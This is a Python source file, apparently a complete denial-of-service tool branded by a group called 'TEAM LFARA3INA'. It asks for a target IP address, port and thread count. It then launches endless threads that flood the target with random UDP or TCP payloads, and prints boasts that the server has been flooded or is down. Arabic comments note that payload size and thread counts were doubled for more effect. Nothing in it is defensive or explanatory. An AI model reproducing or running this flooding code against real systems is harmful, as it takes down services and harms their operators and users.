import random
import socket
import threading
import platform
import os

RED = '\033[91m'
RESET = '\033[0m'
BOLD = '\033[1m'

os.system('cls' if platform.system() == 'Windows' else 'clear')
print(f"{RED}{BOLD}DDoS is Running on: {platform.system()}{RESET}")

banner = f"""{RED}{BOLD}
TEAM LFARA3INA TGLT NB3TOK TT7ASB LHIH :

██████╗  █████╗ ██████╗ ██████╗ ███████╗
██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝
██████╔╝███████║██║  ██║██████╔╝█████╗  
██╔═══╝ ██╔══██║██║  ██║██╔══██╗██╔══╝  
██║     ██║  ██║██████╔╝██║  ██║███████╗
╚═╝     ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝
{RESET}
"""

print(banner)

ip = input("Server IP         : ")
port = int(input("Port              : "))
choice = input("Use UDP attack? (y/n): ")
times = int(input("Packets per thread: "))
threads = int(input("Number of threads : "))

# زيادة حجم البيانات
udp_payload = random._urandom(2048)
tcp_payload = random._urandom(4096)

def udp_attack():
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip), int(port))
			for _ in range(times * 2):  # مضاعفة التكرار
				s.sendto(udp_payload, addr)
			print(f"{RED}[UDP] TEAM LFARA3INA ZA7MO SERVER!!!{RESET}")
		except Exception:
			print(f"{RED}[!] SERVER MAY BE DOWN!{RESET}")

def tcp_attack():
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip, port))
			s.send(tcp_payload)
			for _ in range(times * 2):
				s.send(tcp_payload)
			print(f"{RED}[TCP] TEAM LFARA3INA FAJRO SERVER!!!{RESET}")
			s.close()
		except:
			print(f"{RED}[*] CONNECTION FAILED!{RESET}")
			s.close()

# تشغيل الهجوم
for _ in range(threads * 2):  # مضاعفة عدد الخيوط
	attack_thread = threading.Thread(target=udp_attack if choice.lower() == 'y' else tcp_attack)
	attack_thread.start()